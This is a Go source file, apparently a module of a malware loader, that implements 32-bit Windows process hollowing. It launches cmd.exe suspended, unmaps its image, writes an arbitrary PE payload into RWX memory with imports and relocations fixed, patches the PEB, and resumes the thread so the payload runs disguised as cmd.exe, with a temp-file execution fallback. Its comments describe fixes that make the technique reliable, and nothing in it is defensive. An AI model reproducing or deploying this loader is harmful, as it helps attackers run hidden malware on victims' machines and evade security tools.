//go:build ignore

package main

import (
	"encoding/binary"
	"os"
	"syscall"
	"unsafe"
)

// ---------------------------------------------------------------------------
// Windows types (32-bit)
// ---------------------------------------------------------------------------

// _STARTUPINFO32 mirrors the 32-bit Windows STARTUPINFOA structure (68 bytes).
type _STARTUPINFO32 struct {
	Cb            uint32
	_             uint32
	_             uint32
	_             uint32
	X, Y          uint32
	XSize, YSize  uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             uint32
	StdInput      uint32
	StdOutput     uint32
	StdError      uint32
}

// _PROCESS_INFORMATION32 mirrors the 32-bit PROCESS_INFORMATION structure.
type _PROCESS_INFORMATION32 struct {
	Process   uint32
	Thread    uint32
	ProcessID uint32
	ThreadID  uint32
}

// _CONTEXT32 is the full 0x2CC-byte x86 CONTEXT block.
// Use a flat byte array to avoid struct alignment surprises.
type _CONTEXT32 [0x2CC]byte

// x86 CONTEXT field offsets (from winnt.h WOW64_CONTEXT / CONTEXT_X86 layout).
const (
	ctx32FlagsOff = 0x00 // DWORD ContextFlags
	ctx32EaxOff   = 0xB0 // DWORD Eax – entry point (set for hollowing)
	ctx32EbxOff   = 0xAC // DWORD Ebx – PEB address (read at thread start)
)

func ctx32SetFlags(c *_CONTEXT32, f uint32) {
	binary.LittleEndian.PutUint32(c[ctx32FlagsOff:], f)
}
func ctx32Ebx(c *_CONTEXT32) uint32 {
	return binary.LittleEndian.Uint32(c[ctx32EbxOff:])
}
func ctx32SetEax(c *_CONTEXT32, v uint32) {
	binary.LittleEndian.PutUint32(c[ctx32EaxOff:], v)
}

// ---------------------------------------------------------------------------
// PE section helpers (32-bit)
// ---------------------------------------------------------------------------

type hollowSection32 struct {
	virtualAddress uint32
	virtualSize    uint32
	rawOffset      uint32
	rawSize        uint32
}

func hollowParseSections32(data []byte, peOff uint32) []hollowSection32 {
	nSec := binary.LittleEndian.Uint16(data[peOff+6:])
	optSz := binary.LittleEndian.Uint16(data[peOff+20:])
	start := peOff + 24 + uint32(optSz)
	out := make([]hollowSection32, 0, nSec)
	for i := uint16(0); i < nSec; i++ {
		off := start + uint32(i)*40
		if int(off+40) > len(data) {
			break
		}
		out = append(out, hollowSection32{
			virtualAddress: binary.LittleEndian.Uint32(data[off+12:]),
			virtualSize:    binary.LittleEndian.Uint32(data[off+8:]),
			rawOffset:      binary.LittleEndian.Uint32(data[off+20:]),
			rawSize:        binary.LittleEndian.Uint32(data[off+16:]),
		})
	}
	return out
}

func hollowRvaToOffset32(secs []hollowSection32, rva uint32) (uint32, bool) {
	for _, s := range secs {
		if rva >= s.virtualAddress && rva < s.virtualAddress+s.virtualSize {
			return s.rawOffset + (rva - s.virtualAddress), true
		}
	}
	return 0, false
}

func hollowReadCString32(data []byte, off uint32) string {
	if int(off) >= len(data) {
		return ""
	}
	end := int(off)
	for end < len(data) && data[end] != 0 {
		end++
	}
	return string(data[off:end])
}

// ---------------------------------------------------------------------------
// IAT resolution (32-bit)
// ---------------------------------------------------------------------------

// hollowFixImports32 resolves the IAT in-place on the local buffer.
// Same approach as 64-bit: LoadLibrary/GetProcAddress in our process,
// write resolved addresses to FirstThunk entries (4-byte thunks for PE32).
func hollowFixImports32(buf []byte, optOff uint32, secs []hollowSection32) {
	// PE32 data directory entry 1 = Import Directory (at optOff + 96 + 8).
	dirOff := optOff + 96 + 1*8
	if int(dirOff+8) > len(buf) {
		return
	}
	importRVA := binary.LittleEndian.Uint32(buf[dirOff:])
	if importRVA == 0 {
		return
	}
	impOff, ok := hollowRvaToOffset32(secs, importRVA)
	if !ok {
		return
	}

	// Walk IMAGE_IMPORT_DESCRIPTORs (20 bytes each, null-terminated).
	for off := impOff; ; off += 20 {
		if int(off+20) > len(buf) {
			break
		}
		origFT := binary.LittleEndian.Uint32(buf[off:])
		nameRVA := binary.LittleEndian.Uint32(buf[off+12:])
		firstThunk := binary.LittleEndian.Uint32(buf[off+16:])
		if nameRVA == 0 && firstThunk == 0 {
			break
		}

		nameOff, ok := hollowRvaToOffset32(secs, nameRVA)
		if !ok {
			continue
		}
		dllName := hollowReadCString32(buf, nameOff)
		if dllName == "" {
			continue
		}

		dllPtr, err := syscall.BytePtrFromString(dllName)
		if err != nil {
			continue
		}
		hMod, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllPtr)))
		if hMod == 0 {
			continue
		}

		lookupRVA := origFT
		if lookupRVA == 0 {
			lookupRVA = firstThunk
		}

		for idx := uint32(0); ; idx++ {
			lkOff, ok := hollowRvaToOffset32(secs, lookupRVA+idx*4)
			if !ok || int(lkOff+4) > len(buf) {
				break
			}
			ftOff, ok := hollowRvaToOffset32(secs, firstThunk+idx*4)
			if !ok || int(ftOff+4) > len(buf) {
				break
			}

			thunk := binary.LittleEndian.Uint32(buf[lkOff:])
			if thunk == 0 {
				break
			}

			var addr uintptr
			if thunk&0x80000000 != 0 {
				// Import by ordinal.
				addr, _, _ = procGetProcAddress.Call(hMod, uintptr(thunk&0xFFFF))
			} else {
				// Import by name (IMAGE_IMPORT_BY_NAME: 2-byte Hint + name).
				hnOff, ok := hollowRvaToOffset32(secs, thunk)
				if !ok || int(hnOff+2) >= len(buf) {
					break
				}
				fn := hollowReadCString32(buf, hnOff+2)
				if fn == "" {
					break
				}
				fnPtr, _ := syscall.BytePtrFromString(fn)
				addr, _, _ = procGetProcAddress.Call(hMod, uintptr(unsafe.Pointer(fnPtr)))
			}
			if addr != 0 {
				binary.LittleEndian.PutUint32(buf[ftOff:], uint32(addr))
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Local relocation processing (32-bit)
// ---------------------------------------------------------------------------

// hollowApplyRelocations32 processes the PE base-relocation table locally on
// the payload buffer, adjusting addresses by delta. Handles HIGHLOW (0x3).
func hollowApplyRelocations32(buf []byte, optOff uint32, secs []hollowSection32, delta int32) {
	// PE32 data directory entry 5 = Base Relocation (at optOff + 96 + 40).
	dirOff := optOff + 96 + 5*8
	if int(dirOff+8) > len(buf) {
		return
	}
	relocRVA := binary.LittleEndian.Uint32(buf[dirOff:])
	relocSz := binary.LittleEndian.Uint32(buf[dirOff+4:])
	if relocRVA == 0 || relocSz == 0 {
		return
	}
	fOff, ok := hollowRvaToOffset32(secs, relocRVA)
	if !ok || int(fOff)+int(relocSz) > len(buf) {
		return
	}

	tbl := buf[fOff:]
	off := uint32(0)
	for off < relocSz {
		if off+8 > relocSz {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(tbl[off:])
		blkSz := binary.LittleEndian.Uint32(tbl[off+4:])
		if blkSz < 8 {
			break
		}
		off += 8
		n := (blkSz - 8) / 2
		for i := uint32(0); i < n; i++ {
			if off+2 > relocSz {
				return
			}
			e := binary.LittleEndian.Uint16(tbl[off:])
			off += 2
			t := e >> 12
			rva := pageRVA + uint32(e&0x0FFF)
			targetOff, ok := hollowRvaToOffset32(secs, rva)
			if !ok {
				continue
			}
			switch t {
			case 0: // IMAGE_REL_BASED_ABSOLUTE – padding, skip
			case 0x3: // IMAGE_REL_BASED_HIGHLOW
				if int(targetOff+4) <= len(buf) {
					v := binary.LittleEndian.Uint32(buf[targetOff:])
					binary.LittleEndian.PutUint32(buf[targetOff:], uint32(int32(v)+delta))
				}
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Strategy entry point
// ---------------------------------------------------------------------------

func executeStrategy(payload []byte) {
	executeProcessHollowing32(payload)
}

// executeProcessHollowing32 creates a suspended process, replaces its image
// with the given 32-bit PE payload, resolves imports, optionally applies
// relocations (MSVC only), and resumes the thread.
//
// Key fixes over the previous version:
//   - Added IAT resolution (was completely missing, causing crashes).
//   - Fixed relocation directory offset (was 104, correct is 136 for PE32).
//   - Added linker detection (MSVC≥10 vs MinGW<10).
//   - Only sets Eax for entry (was also setting Eip, bypassing RtlUserThreadStart).
//   - Applies relocations locally on a working copy (no ReadProcessMemory).
func executeProcessHollowing32(payload []byte) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}
	peOff := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOff)+4 > len(payload) || string(payload[peOff:peOff+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	optOff := peOff + 24
	imageBase := binary.LittleEndian.Uint32(payload[optOff+28:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])

	// Linker detection: MajorLinkerVersion at PE+26 (= optOff+2).
	isMSVC := payload[peOff+26] >= 10

	target := os.Getenv("ComSpec")
	if target == "" {
		target = `C:\Windows\System32\cmd.exe`
	}

	hProcess, hThread, ok := hollow32CreateProcess(target)
	if !ok {
		executeFromTemp(payload)
		return
	}
	defer procCloseHandle.Call(uintptr(hThread))
	defer procCloseHandle.Call(uintptr(hProcess))

	// On x86, Ebx holds the PEB address at thread start.
	var ctx _CONTEXT32
	const ctxFull32 = 0x0001003F // CONTEXT_i386 | CONTEXT_FULL
	ctx32SetFlags(&ctx, ctxFull32)
	procGetThreadCtx.Call(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)))
	remotePEB := ctx32Ebx(&ctx)

	// Read remote image base from PEB+0x08 (ImageBaseAddress for 32-bit PEB).
	var remoteImageBase uint32
	var nRead uintptr
	procReadProcessMem.Call(
		uintptr(hProcess),
		uintptr(remotePEB)+0x08,
		uintptr(unsafe.Pointer(&remoteImageBase)),
		4,
		uintptr(unsafe.Pointer(&nRead)),
	)

	// Unmap original image.
	if remoteImageBase != 0 {
		procNtUnmapView.Call(uintptr(hProcess), uintptr(remoteImageBase))
	}

	// Allocate memory. MSVC prefers payload's ImageBase; MinGW prefers
	// the remote base (PIC code, no relocation needed).
	var desiredBase uintptr
	if isMSVC {
		desiredBase = uintptr(imageBase)
	} else if remoteImageBase != 0 {
		desiredBase = uintptr(remoteImageBase)
	} else {
		desiredBase = uintptr(imageBase)
	}
	base, _, _ := procVirtualAllocEx.Call(uintptr(hProcess), desiredBase, uintptr(sizeOfImage), 0x3000, 0x40)
	if base == 0 && isMSVC && desiredBase != uintptr(remoteImageBase) && remoteImageBase != 0 {
		base, _, _ = procVirtualAllocEx.Call(uintptr(hProcess), uintptr(remoteImageBase), uintptr(sizeOfImage), 0x3000, 0x40)
	}
	if base == 0 {
		base, _, _ = procVirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(sizeOfImage), 0x3000, 0x40)
		if base == 0 {
			executeFromTemp(payload)
			return
		}
	}

	// Work on a copy so IAT/relocation patches do not touch the original.
	buf := make([]byte, len(payload))
	copy(buf, payload)

	secs := hollowParseSections32(buf, peOff)

	// Fix imports FIRST (before relocations corrupt thunk values).
	hollowFixImports32(buf, optOff, secs)

	// Apply relocations (MSVC only, when allocated base ≠ preferred base).
	delta := int32(base) - int32(imageBase)
	if isMSVC && delta != 0 {
		hollowApplyRelocations32(buf, optOff, secs, delta)
	}

	// Write PE headers.
	if !hollow32WriteMem(hProcess, uint32(base), buf[:sizeOfHeaders]) {
		executeFromTemp(payload)
		return
	}

	// Write sections from the modified buffer.
	nSec := binary.LittleEndian.Uint16(buf[peOff+6:])
	optSz := binary.LittleEndian.Uint16(buf[peOff+20:])
	secStart := peOff + 24 + uint32(optSz)
	for i := uint16(0); i < nSec; i++ {
		hdr := secStart + uint32(i)*40
		if int(hdr+40) > len(buf) {
			break
		}
		va := binary.LittleEndian.Uint32(buf[hdr+12:])
		rawSz := binary.LittleEndian.Uint32(buf[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(buf[hdr+20:])
		if rawSz == 0 || int(rawPtr+rawSz) > len(buf) {
			continue
		}
		if !hollow32WriteMem(hProcess, uint32(base)+va, buf[rawPtr:rawPtr+rawSz]) {
			executeFromTemp(payload)
			return
		}
	}

	// Update PEB ImageBaseAddress.
	newBase := uint32(base)
	hollow32WriteMem(hProcess, remotePEB+0x08, (*[4]byte)(unsafe.Pointer(&newBase))[:])

	// Set entry point via Eax only (standard x86 hollowing: RtlUserThreadStart
	// reads the entry address from Eax). Do NOT modify Eip — it must remain
	// pointing at RtlUserThreadStart for proper thread initialization.
	ctx32SetEax(&ctx, uint32(base)+entryRVA)
	procSetThreadCtx.Call(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)))
	procResumeThread.Call(uintptr(hThread))
}

// ---------------------------------------------------------------------------
// Process and memory helpers
// ---------------------------------------------------------------------------

func hollow32CreateProcess(targetPath string) (hProcess, hThread uint32, ok bool) {
	appName, err := syscall.UTF16PtrFromString(targetPath)
	if err != nil {
		return 0, 0, false
	}
	var si _STARTUPINFO32
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi _PROCESS_INFORMATION32
	const createSuspended = 0x00000004
	r, _, _ := procCreateProcess.Call(
		uintptr(unsafe.Pointer(appName)),
		0, 0, 0, 0,
		createSuspended,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return 0, 0, false
	}
	return pi.Process, pi.Thread, true
}

func hollow32WriteMem(hProcess uint32, addr uint32, data []byte) bool {
	if len(data) == 0 {
		return true
	}
	var written uintptr
	r, _, _ := procWriteProcessMem.Call(
		uintptr(hProcess), uintptr(addr),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r != 0
}
